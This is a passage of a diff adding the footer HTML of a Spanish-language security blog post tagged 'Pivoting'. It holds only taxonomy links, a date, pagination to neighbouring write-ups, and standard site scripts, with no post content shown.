+      <a href="/tags/#pivoting" class="page__taxonomy-item" rel="tag">Pivoting</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tecnicas" class="page__taxonomy-item" rel="tag">Tecnicas</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-10-27T00:00:00-03:00">October 27, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/ICA1-Writeup/" class="pagination--pager" title="ICA 1 - VulnHub Writeup
+">Previous</a>
+    
+    
+      <a href="/chmod-privilege-escalation/" class="pagination--pager" title="Chmod - Privilege Escalation
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 notlucken</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
